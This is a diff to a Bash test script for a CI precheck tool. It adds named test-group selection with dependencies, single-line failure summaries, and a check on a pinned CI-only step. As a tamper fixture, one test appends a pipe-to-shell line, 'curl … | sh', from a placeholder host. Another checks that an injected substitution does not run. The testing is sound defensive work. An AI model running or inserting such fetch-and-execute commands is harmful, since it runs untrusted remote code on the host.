@@ -60,7 +60,10 @@ fail() {
     avail=$(tmp_avail)
     [[ $avail =~ ^[0-9]+$ ]] && ((avail < need_kib)) && host_refuse "line $line hit no space left on device"
   fi
-  printf 'case "%s" line %s: %s\n' "$group" "$line" "$*" >>"$tmp/failures"
+  # ASD-V0-2473 (V1-4525): one summary line per failed case, so a multi-line message counts once.
+  msg=$*
+  msg=${msg//$'\n'/ | }
+  printf 'case "%s" line %s: %s\n' "$group" "$line" "${msg:0:300}" >>"$tmp/failures"
   {
     printf 'batch-precheck_test: FAIL case "%s" line %s: %s\n' "$group" "$line" "$*"
     [[ -s $tmp/out ]] && { printf 'batch-precheck_test: last output (%s), last 40 lines:\n' "$tmp/out"; tail -n 40 "$tmp/out" | sed 's/^/  | /'; }
@@ -105,7 +108,7 @@ if [[ ${BATCH_PRECHECK_TEST_SEED-} == 1 ]]; then
 # 0a. ASD-V0-780 seeded failure one: the run must go on to the next case.
   false || fail "seeded failure one"
 # 0b. ASD-V0-780 seeded failure two, inside a subshell.
-  (false || fail "seeded failure two")
+  (false || fail "seeded failure two"$'\n'"with a second line")
   finish
 fi
 # 0c. ASD-V0-780: a failing case does not stop the run; the summary names every failed case.
@@ -114,10 +117,47 @@ seed_rc=$?
 [[ $seed_rc == 1 ]] || fail "seeded run exited $seed_rc, want 1: $(cat "$tmp/out")"
 grep -q '^batch-precheck_test: FAIL 2 case(s):$' "$tmp/out" || fail "seeded run did not count two failed cases: $(cat "$tmp/out")"
 grep -q '^  - case "0a\. ASD-V0-780 seeded failure one.*seeded failure one$' "$tmp/out" &&
-  grep -q '^  - case "0b\. ASD-V0-780 seeded failure two.*seeded failure two$' "$tmp/out" ||
+  grep -q '^  - case "0b\. ASD-V0-780 seeded failure two.*seeded failure two | with a second line$' "$tmp/out" ||
   fail "seeded summary did not name both cases: $(cat "$tmp/out")"
 : > "$tmp/out"
 
+# ASD-V0-2473 (V1-4525): BATCH_PRECHECK_TEST_GROUPS="1 9b" runs only the named groups (the labels
+# of the `# N.` headers) after the self-checks above, with the earlier groups whose fixtures they
+# reuse (group_deps; the fixture group 2 for every later group). Unset or empty runs every group. A
+# label that names no group refuses with exit 2 before any group runs. The full run took 178 s on
+# wsl-lanes at 6c33df33.
+labels=" $(awk '/^# [0-9]+[a-z]?\. / { l = $2; sub(/\.$/, "", l); printf "%s ", l }' "$script/batch-precheck_test.sh")"
+for g in ${BATCH_PRECHECK_TEST_GROUPS-}; do
+  [[ $labels == *" $g "* ]] || { failed=1; printf 'batch-precheck_test: REFUSE unknown-group %s: the groups are%s\n' "$g" "$labels" >&2; exit 2; }
+done
+after_fixture=" ${labels#* 2 }"
+group_deps() {
+  case $1 in
+    4 | 4a | 4b | 4c | 4d | 5) printf '3' ;;
+    3b) printf '4' ;;
+    6b | 8) printf '6' ;;
+    7) printf '4b' ;;
+    9 | 10 | 10b | 13 | 10d) printf '8' ;;
+    10c) printf '6 10d' ;;
+    12) printf '10d' ;;
+    15) printf '7 13' ;;
+    16) printf '7 13 15' ;;
+    17) printf '7 15 16' ;;
+  esac
+}
+needed=" "
+need() {
+  local d
+  [[ $needed == *" $1 "* ]] && return 0
+  needed+="$1 "
+  for d in $(group_deps "$1"); do need "$d"; done
+  [[ $after_fixture == *" $1 "* ]] && need 2
+  return 0
+}
+for g in ${BATCH_PRECHECK_TEST_GROUPS-}; do need "$g"; done
+group() { [[ -z ${BATCH_PRECHECK_TEST_GROUPS-} || $needed == *" $1 "* ]]; }
+
+if group 1; then
 # 1. The real workflow: every doc-gates command is a make target or go run, every gofmt set is
 # mirrored, every drift prefix names a test and every golden writer is listed. This is the check
 # that fails when CI gains a step batch-precheck cannot run.
@@ -135,6 +175,8 @@ grep -qx 'batch-drift TestCorvintBundledBinariesBuildTwiceIdentically' "$tmp/out
   grep -qx 'batch-drift TestCurrentTasksSourceArchiveBuildsOffline' "$tmp/out" || fail "the @own drift tests are not their own steps: $(cat "$tmp/out")"
 grep -qx 'make host-adapter-node-test' "$tmp/out" || fail "no host-adapter-node-test step: $(cat "$tmp/out")"
 
+fi
+if group 1d; then
 # 1d. ASD-V0-2010/2011 (V1-4331/4332): cheap spec checks fail before repins or Go.
 grep -A1 '^dogfood-closeout:$' "$script/../Makefile" | grep -qF 'spec-capacity-check spec-readme-check BASE="$(BASE)"' || fail "closeout lost its static checks or lane BASE"
 static_repo=$tmp/static-specs
@@ -209,6 +251,8 @@ for static_base_env in BATCH_PRECHECK_BASE DOGFOOD_BASE; do
   grep -qF 'FAIL static spec checks' "$tmp/out" || fail "no fail-fast summary: $(cat "$tmp/out")"
 done
 
+fi
+if group 1c; then
 # 1c. DCW-V0-399 (V1-3218): the lane's pre-bind `make doc-gates` reaches ./internal/specindex,
 # whose TestIndexCoversSpecsAndHeaders refuses an Agent digest Status that drifts from the header.
 (cd "$script/.." && make -n --no-print-directory HEAVY_ADMIT= doc-gates) > "$tmp/out" 2>&1 || fail "make -n doc-gates: $(cat "$tmp/out")"
@@ -219,6 +263,8 @@ grep -q 'make doc-gates' "$script/../docs/DOGFOOD.md" || fail "lane recipe no lo
 # Focused mode for spec-only changes avoids unrelated node/lifecycle fixture groups.
 [[ ${BATCH_PRECHECK_TEST_STATIC_ONLY:-} != 1 ]] || finish
 
+fi
+if group 1b; then
 # 1b. ASD-V0-044 (V1-3062): that step catches a Pi adapter version bump that leaves the
 # docs/specs/pi-workflow-v0.md capability tuple behind. On a copy of the adapter, its spec and the
 # native literal, the tuple set to the package version passes PWV-V0-011 and a stale version
@@ -250,6 +296,8 @@ grep -q '^not ok .* PWV-V0-011 registered tools' "$tmp/out" || fail "stale tuple
 grep -q "adapterVersion: '0.0.0-stale'" "$tmp/out" || fail "stale tuple assertion did not name its adapter version: $(tail -40 "$tmp/out")"
 fi
 
+fi
+if group 2; then
 # 2. A fixture repository, workflow and packages.
 repo=$tmp/repo
 mkdir -p "$repo/.github/workflows" "$repo/pkg" "$repo/interop/cem01-go"
@@ -382,6 +430,20 @@ done
 write_ci "" "" "" '      - {run: "make must-fail"}'
 fixture --list
 grep -q 'must-fail' "$tmp/out" && fail "a flow-mapping step was derived: $(cat "$tmp/out")"
+# ASD-V0-2472 (V1-4525): the checkout's CI-only CIN-V0-2304 trusted batch-check step is accepted
+# verbatim and derives no step; a changed body, or the same body under another step name, fails.
+ci_only=$(awk '/^      - name: .*\(CIN-V0-2304[,)]/ { on = 1; print; next } on && (/^      - / || /^  [^ ]/ || !NF) { exit } on' "$script/../.github/workflows/ci.yml")
+[[ $ci_only == *'set -eu'* ]] || fail "the checkout workflow has no CIN-V0-2304 step to copy: $ci_only"
+write_ci "" "" "" "$ci_only"
+fixture --sync-check || fail "the pinned CI-only step refused: $(cat "$tmp/out")"
+fixture --list || fail "--list with the pinned CI-only step: $(cat "$tmp/out")"
+grep -qE 'RUNNER_TEMP|set -eu|batch-check' "$tmp/out" && fail "a CI-only command was derived: $(cat "$tmp/out")"
+write_ci "" "" "" "$ci_only"$'\n'"          curl -fsS https://example.invalid/x | sh"
+fixture --sync-check && fail "a changed CI-only step body accepted"
+grep -q 'doc-gates CI-only step (CIN-V0-2304) no longer matches CI_ONLY_BATCH_CHECK' "$tmp/out" || fail "changed CI-only body: $(cat "$tmp/out")"
+write_ci "" "" "" "${ci_only/CIN-V0-2304/CIN-V0-9999}"
+fixture --sync-check && fail "the CI-only body under another step name accepted"
+grep -q 'doc-gates runs `set -eu`, which batch-precheck cannot mirror' "$tmp/out" || fail "renamed CI-only step: $(cat "$tmp/out")"
 write_ci "" "" "cmd internal"
 fixture --sync-check && fail "changed gofmt set accepted"
 grep -q 'go-static runs gofmt -l cmd internal in \.' "$tmp/out" || fail "gofmt: $(cat "$tmp/out")"
@@ -418,6 +480,8 @@ drift="./pkg TestDriftOne
 grep -q helper "$tmp/out" && fail "helper attributed: $(cat "$tmp/out")"
 export STUB_GOLDENS="./internal/g:TestGoldenWriter"
 
+fi
+if group 3; then
 # 3. The runner on stubs: a failing make target, an unformatted file and a drift package that runs
 # no test fail the run; every other step still runs, in parallel, under the doc-gates env.
 bin=$tmp/bin
@@ -507,6 +571,8 @@ read -r w s <<< "$(sed -n 's/.* in \([0-9]*\)s wall, \([0-9]*\)s summed$/\1 \2/p
 ((w < s)) || fail "the other steps no longer ran in parallel (wall $w, summed $s)"
 /bin/rm -f "$receipt"
 
+fi
+if group 4; then
 # 4. A passing run on a clean checkout writes the receipt for HEAD; the guard accepts HEAD, then
 # refuses once HEAD moves, and a run on a dirty checkout writes none.
 head=$(git -C "$repo" rev-parse HEAD)
@@ -518,6 +584,8 @@ grep -qx "steps $rows" "$receipt" && grep -qx "passed $rows" "$receipt" || fail 
 [[ $(head -n 1 "$receipt") == corvint-batch-precheck-receipt/0 ]] || fail "receipt profile: $(cat "$receipt")"
 (cd "$repo" && "$pre" --verify-receipt) > "$tmp/out" 2>&1 || fail "guard refused HEAD: $(cat "$tmp/out")"
 (cd "$repo" && "$pre" --verify-receipt "$head") > /dev/null 2>&1 || fail "guard refused an explicit REV"
+fi
+if group 4a; then
 # 4a. ASD-V0-973 (V1-3801, V1-3241): with node absent, host-adapter-node-test does not run; its row
 # is NOT_AVAILABLE naming the tool, it is neither passed nor failed, and the receipt records it as
 # a not-run line the guard accepts and prints. A receipt claiming more steps than it accounts for
@@ -556,6 +624,8 @@ PATH=$bin:$PATH BATCH_PRECHECK_HEAVY=$hv drift="./pkg TestDriftOne
 ./internal/g TestGoldenWriter" fixture || fail "quoted heavy run failed: $(cat "$tmp/out")"
 grep -qx heavy "$tmp/calls" || fail "heavy path with a space not run: $(cat "$tmp/calls")"
 [[ -e $repo/pwned || -e $script/pwned || -e pwned ]] && fail "a substitution in BATCH_PRECHECK_HEAVY ran"
+fi
+if group 3b; then
 # 3b. ASD-V0-941 (V1-3037): BATCH_PRECHECK_GO_WRAPPER, one quoted path, wraps every make and go run
 # step; unset, none is wrapped. Two concurrent prechecks whose wrapper takes one shared lock never
 # run two wrapped steps at once.
@@ -670,6 +740,8 @@ grep -q 'unstaged [0-9]* path(s)' "$tmp/out" && fail "an entry staged after the 
 [[ $(git -C "$repo" show :derived.txt) == $'v0\nrepinnedrestaged' ]] || fail "the later staging was lost: $(git -C "$repo" show :derived.txt)"
 git -C "$repo" checkout -q HEAD -- derived.txt
 
+fi
+if group 4b; then
 # 4b. Ledger reuse (ASD-V0-042, V1-2985): a rerun on identical inputs reuses every step's recorded
 # pass, reports it and still writes the receipt; a tree change reruns the whole-tree steps while
 # the gofmt steps (keyed on *.go) still reuse; a changed GO* variable, a staged index that differs
@@ -735,6 +807,8 @@ want_steps=$("$regen" --list | cut -f1 | tr '\n' ' ')
   grep -q '^changed_citations() { script/check-line-citations.sh --repin --changed --base "${BATCH_REGEN_BASE:-origin/main}"; }$' "$regen" ||
   fail "batch-regen does not regenerate documentation-paths or repin changed citations against the base"
 
+fi
+if group 4c; then
 # 4c. ASD-V0-641 (V1-3745): the test-script-refs step fails when a shell test names a script that is
 # not in the tree, naming the file, line and path, and passes once the script exists.
 mkdir -p "$repo/script"
@@ -752,6 +826,8 @@ grep -q '^batch-precheck: | PASS | *[0-9]*s | test-script-refs$' "$tmp/out" || f
 git -C "$repo" rm -q -r script && git -C "$repo" commit -q -m 'drop caller' || fail "caller cleanup"
 /bin/rm -f "$receipt"
 
+fi
+if group 4d; then
 # 4d. ASD-V0-642 (V1-3764): the dr-numbers step fails when two merged lanes both defined one DR-
 # number, naming the number and both lines, and passes once the later entry is renumbered. A tree
 # without a register passes (every earlier case).
@@ -769,6 +845,8 @@ grep -q '^batch-precheck: | PASS | *[0-9]*s | dr-numbers$' "$tmp/out" || fail "d
 git -C "$repo" rm -q -r conformance && git -C "$repo" commit -q -m 'drop register' || fail "register cleanup"
 /bin/rm -f "$receipt"
 
+fi
+if group 5; then
 # 5. batch-regen on stub steps: one commit of the regenerated files, nothing on a second run, a
 # refusal on tracked changes, and no commit when a step fails.
 rg() { BATCH_REGEN_ROOT=$repo BATCH_REGEN_STEPS=$1 "$regen" > "$tmp/out" 2>&1; }
@@ -815,6 +893,8 @@ grep -q '^batch-regen: PASS line-citations' "$tmp/out" || fail "mechanical line-
 /bin/rm -rf "$repo/script"
 "$regen" --golden-tests | grep -qx './cmd/corvint TestCoreVerbsEmitTheFrozenProfiles' || fail "regen goldens list"
 
+fi
+if group 6; then
 # 6. --base (ASD-V0-032, V1-2895): a failure the base shows with the same findings is a base-present
 # WARN that does not fail the run; a new finding in a step the base also fails, a step only the head
 # fails, and an unresolvable base are introduced FAILs.
@@ -907,6 +987,8 @@ for awk_name in awk /usr/bin/awk original-awk mawk; do
   printf 'batch-precheck_test: normalize plain input: %s rc=%s\n' "$awk_bin" "$rc"
 done
 
+fi
+if group 6b; then
 # 6b. ASD-V0-1971 (V1-4327): moving a failing test changes locations and group totals, not its
 # finding. A second finding in the same output must still be introduced.
 printf 'lane-scripts_test: FAIL inherited mismatch 42\nlane-scripts_test: 10 groups passed, 1 failed:\n  group 7: line 123: inherited mismatch 42\n  - case "6b. stable case" line 125: inherited mismatch 42\n    fixture_test.go:17:9: inherited mismatch 42\nbatch-precheck_test: FAIL 1 case(s):\n' > "$crepo/fail-test-commands-check"
@@ -978,6 +1060,8 @@ base3=$(git -C "$crepo" rev-parse HEAD)
 attributed "a test reading an undeclared path (internal/tool.go)"
 /bin/rm -rf "$crepo/integrations" "$crepo/docs" "$crepo/cmd" "$crepo/Makefile" "$crepo/fail-host-adapter-node-test"
 
+fi
+if group 7; then
 # 7. Drift and catalog selection under a base (ASD-V0-050, ASD-V0-051; V1-3134, V1-3136), on a
 # real Go fixture module, a stub planner and a stub make: a diff touching no drift or catalog input
 # runs no go test and skips the catalog check, printing the skipped set; a changed golden runs its
@@ -1217,6 +1301,8 @@ grep -q 'NOT_RUN' "$tmp/out" && fail "10000 non-documentation paths skipped an @
 /bin/rm -rf "$srepo/notes"
 git -C "$srepo" checkout -q -- docs/specs/freeze.md
 
+fi
+if group 8; then
 # 8. ASD-V0-046 (V1-3122): a failed step reruns once before it is classified. A pass on the rerun
 # is FLAKY (counted passed, both attempts named, attempt 1's failing test named); a second failure
 # names both attempts and the failing go subtest and node test names.
@@ -1261,6 +1347,8 @@ git -C "$frepo" rm -q fail-test-commands-check && git -C "$frepo" -c user.name=t
 frun || fail "a flaky-only run failed: $(cat "$tmp/out")"
 grep -q '^batch-precheck: FLAKY make test-read-scopes-check' "$tmp/out" || fail "flaky-only run: $(cat "$tmp/out")"
 
+fi
+if group 9; then
 # 9. ASD-V0-054: a failure naming an exhausted host resource is a host-resource FAIL, never
 # introduced, and is not rerun at the base (whose own run here passes, so a comparison would say
 # introduced); a FLAKY pass names the resource; a TMPDIR below the free-space floor warns first.
@@ -1283,6 +1371,8 @@ grep -Eq '^batch-precheck: FLAKY make capabilities-check: attempt 1 failed rc=1 
 BATCH_PRECHECK_MIN_TMP_KIB=1 frun --base "$fbase"
 grep -q 'low-tmp-space' "$tmp/out" && fail "low-tmp-space warned above the floor: $(cat "$tmp/out")"
 
+fi
+if group 10; then
 # 10. ASD-V0-055 (V1-3205, V1-3206): step scratch stays off a RAM-backed TMPDIR. BATCH_PRECHECK_TMPDIR
 # is every step's TMPDIR; unset, a tmpfs TMPDIR (Linux /dev/shm here) becomes
 # XDG_CACHE_HOME/corvint-tmp, named in one line; a disk TMPDIR is kept.
@@ -1312,6 +1402,8 @@ if [[ $(uname -s) == Linux && $(stat -f -c %T /dev/shm 2> /dev/null) == tmpfs ]]
   fi
 fi
 
+fi
+if group 10b; then
 # 10b. ASD-V0-781 (V1-4016): an exported GOTMPDIR that does not exist is created before
 # any step runs, so a go step does not fail with "GOTMPDIR does not exist".
 /bin/cp -f "$fbin/make" "$tmp/make.saved"
@@ -1320,6 +1412,8 @@ GOTMPDIR=$tmp/gotmp/missing frun || fail "a missing GOTMPDIR failed the run: $(c
 [[ -d $tmp/gotmp/missing ]] || fail "missing GOTMPDIR was not created"
 /bin/cp -f "$tmp/make.saved" "$fbin/make"
 
+fi
+if group 13; then
 # 13. ASD-V0-109 (V1-3267): a sealed CEM the branch adds must be named for a commit in HEAD's
 # history. A resolvable name passes; an unresolvable one fails naming the file and the reseal
 # recovery; an unreachable name the base already holds is not judged; with no base and no
@@ -1377,6 +1471,8 @@ grep -q 'git rm each named tracked file' "$tmp/out" && fail "git rm recovery for
 "$regen" --bogus > /dev/null 2>&1
 [[ $? == 2 ]] || fail "regen bad argument did not exit 2"
 
+fi
+if group 8b; then
 # 8b. V1-3232: a Makefile whose doc-gates recipe has its two known lines expands into one step per
 # target plus the go run; any other recipe keeps `make doc-gates` as one step. An `@own` drift entry
 # is its own go test step beside the union of the others.
@@ -1442,7 +1538,9 @@ grep -qx 'make doc-gates' "$tmp/out" && ! grep -qx 'make alpha-check' "$tmp/out"
 grep -q 'doc-gates recipe no longer matches doc_gate_expansion in script/batch-precheck.sh' "$tmp/out" ||
   fail "a drifted doc-gates recipe gave no pointer to doc_gate_expansion: $(cat "$tmp/out")"
 
-# 9. ASD-V0-070 (V1-3233): under an empty environment (env -i) a run and --list refuse with exit 3
+fi
+if group 9b; then
+# 9b. ASD-V0-070 (V1-3233): under an empty environment (env -i) a run and --list refuse with exit 3
 # naming the unset HOME, a bad argument still exits 2, and --sync-check needs no cache.
 (cd "$script/.." && env -i "$pre") > "$tmp/out" 2>&1
 [[ $? == 3 ]] || fail "env -i run did not exit 3: $(cat "$tmp/out")"
@@ -1456,7 +1554,9 @@ grep -q 'unbound variable' "$tmp/out" && fail "env -i aborted on an unbound vari
 (cd "$script/.." && env -i TMPDIR="$tmp" "$pre" --sync-check) > "$tmp/out" 2>&1 || fail "env -i --sync-check: $(cat "$tmp/out")"
 (cd "$script/.." && env -i TMPDIR="$tmp" CORVINT_GOCACHE=$tmp/gc "$pre" --list) > /dev/null 2>&1 || fail "env -i with CORVINT_GOCACHE --list failed"
 
-# 10. ASD-V0-831 (V1-3337): ai-coauthor-trailers is the one AI-trailer step (ASD-V0-071's
+fi
+if group 10d; then
+# 10d. ASD-V0-831 (V1-3337): ai-coauthor-trailers is the one AI-trailer step (ASD-V0-071's
 # ai-trailers step is retired; make ai-coauthor-trailers-test covers the check itself). A --base run
 # with an AI trailer since the base fails it as introduced, never base-present.
 trepo=$tmp/trepo
@@ -1482,6 +1582,8 @@ grep -Eq '^batch-precheck: \| FAIL \| +[0-9]+s \| ai-coauthor-trailers \([0-9a-f
   fail "ai-coauthor-trailers not an introduced FAIL: $(cat "$tmp/out")"
 grep -q 'WARN ai-coauthor-trailers' "$tmp/out" && fail "ai-coauthor-trailers was downgraded to base-present: $(cat "$tmp/out")"
 
+fi
+if group 10c; then
 # 10c. ASD-V0-784 (V1-3504): the merge-conflict-comments step refuses a commit since the batch base
 # whose message keeps git's "# Conflicts:" block, naming the commit and the strip recovery; a clean
 # range passes, a base that does not resolve exits 2, and no base without origin/main is a skip.
@@ -1502,6 +1604,8 @@ git -C "$crepo" commit -q --allow-empty --cleanup=verbatim -m "Merge branch 'lan
 grep -q "^merge-conflict-comments: $csha keeps a \"# Conflicts:\" block" "$tmp/out" || fail "the dirty commit is not named: $(cat "$tmp/out")"
 grep -q 'cleanup=strip' "$tmp/out" || fail "no strip recovery named: $(cat "$tmp/out")"
 
+fi
+if group 11; then
 # 11. ASD-V0-073 (V1-3238): the legal-file-pins step refuses a legal file whose manifest sha256 is
 # stale, naming the file and the manifest, and a missing one; matching pins pass.
 lrepo=$tmp/lrepo
@@ -1532,6 +1636,8 @@ mkdir -p "$lrepo/script" && /bin/cp -f "$script/check-legal-file-pins.sh" "$lrep
 grep -q '^check-legal-file-pins: FAIL legal-file-altered LICENSING.md ' "$tmp/out" ||
   fail "make legal-file-pins-check did not name the edited LICENSING.md: $(cat "$tmp/out")"
 
+fi
+if group 12; then
 # 12. ASD-V0-072 (V1-3230): a --base run in a shallow clone refuses with the unshallow recovery
 # before any step runs.
 srepo2=$tmp/shallow
@@ -1548,7 +1654,9 @@ for w in dogfood-change dogfood-check dogfood-bind-range; do
   [[ $? == 2 ]] && grep -q "^$w: REFUSE shallow-repository: .* fetch --unshallow origin" "$tmp/out" || fail "$w in a shallow clone: $(cat "$tmp/out")"
 done
 
-# 13. ASD-V0-582 (V1-3364): the binary-blobs-check doc gate (a batch-precheck step by group 1)
+fi
+if group 13b; then
+# 13b. ASD-V0-582 (V1-3364): the binary-blobs-check doc gate (a batch-precheck step by group 1)
 # refuses a committed binary blob outside a declared fixture path and a tools/ main whose root
 # build output is not ignored; a testdata/ fixture and an ignored tool output pass.
 brepo=$tmp/brepo
@@ -1622,6 +1730,8 @@ grep -q '^check-fixed-tmp-paths: FAIL pkg/bad_test.go:4: ' "$tmp/out" &&
   grep -q '^check-fixed-tmp-paths: FAIL pkg/bad_test.go:7: ' "$tmp/out" &&
   [[ $(grep -c FAIL "$tmp/out") == 4 ]] || fail "the fixed /tmp lines were not named exactly: $(cat "$tmp/out")"
 
+fi
+if group 14; then
 # 14. ASD-V0-583 (V1-3373): license-headers-check and mkfifo-build-tags-check are doc gates, and the
 # Mkfifo check refuses a file calling syscall.Mkfifo under //go:build unix (which includes solaris)
 # or with no constraint at all, while an explicit GOOS list, unix && !solaris and a GOOS file-name
@@ -1648,6 +1758,8 @@ grep -q '^check-mkfifo-build-tags: FAIL pkg/unix_test.go: calls syscall.Mkfifo u
   fail "the unix-tagged and untagged Mkfifo files were not both named: $(cat "$tmp/out")"
 [[ $(grep -c FAIL "$tmp/out") == 2 ]] || fail "an allowed Mkfifo file was refused: $(cat "$tmp/out")"
 
+fi
+if group 15; then
 # 15. ASD-V0-943, ASD-V0-944, DCW-V0-944 (V1-3550): the closeout's sealed-head run selects since the
 # first run's receipt, and selection-baseline-check is skipped when none of its inputs changed, with
 # or without a usable plan.
@@ -1720,6 +1832,8 @@ BATCH_PRECHECK_SINCE_RECEIPT=1 rrun --base "$rbase" || fail "no-receipt run fail
 grep -q '^batch-precheck: since-receipt not used: no well-formed passing receipt' "$tmp/out" || fail "a missing receipt was used: $(cat "$tmp/out")"
 grep -q "^batch-precheck: batch-drift runs .* for the diff since $rbase" "$tmp/out" || fail "no-receipt run did not keep its base: $(cat "$tmp/out")"
 
+fi
+if group 16; then
 # 16. ICL-V0-020, ICL-V0-021 (V1-1629): the pre-bind run (BATCH_PRECHECK_SKIP_DRIFT=1) runs the
 # @prebind drift entries, which no bind or seal can reach, so a failure stops the closeout before
 # the bind; it records their passes for its head. The run on the sealed head carries each recorded
@@ -1818,6 +1932,8 @@ row_is PASS 'batch-drift TestFreeze'
 /bin/rm -rf "$rrepo/internal"
 
 
+fi
+if group 17; then
 # 17. ASD-V0-1990 (V1-4329): selection-baseline is deferred in both lane closeout passes,
 # including Go changes, unusable plans and no readable diff; batch mode keeps its original check.
 for target in dogfood-closeout dogfood-closeout-precheck; do
@@ -1929,6 +2045,8 @@ grep -qE '^make -s (doc-gates|selection-baseline-check)$' "$tmp/scalls" && fail 
 : > "$tmp/scalls"
 LANE=0 rrun --base "$rbase" || fail "opaque doc-gates non-lane run: $(cat "$tmp/out")"
 grep -qx 'make -s doc-gates' "$tmp/scalls" || fail "non-lane aggregate fallback changed"
+fi
+if group 18; then
 # 18. ASD-V0-1923 (V1-4317): --static runs the static doc gates and go build/vet of the changed
 # packages first, one at a time; the first failure prints `FAIL static GATE`, its output and a
 # `fix:` line and nothing later runs, well inside 60 s. A full run starts with the same phase and
@@ -2046,5 +2164,7 @@ for mode in --static ''; do
   grep -qx 'go vet ./pkg' "$tmp/stcalls" || fail "test-only package not vetted: $(cat "$tmp/stcalls")"
 done
 strun --static --base 2> /dev/null; [[ $? == 2 ]] || fail "--static --base without REV was accepted"
+
+fi
 
 finish
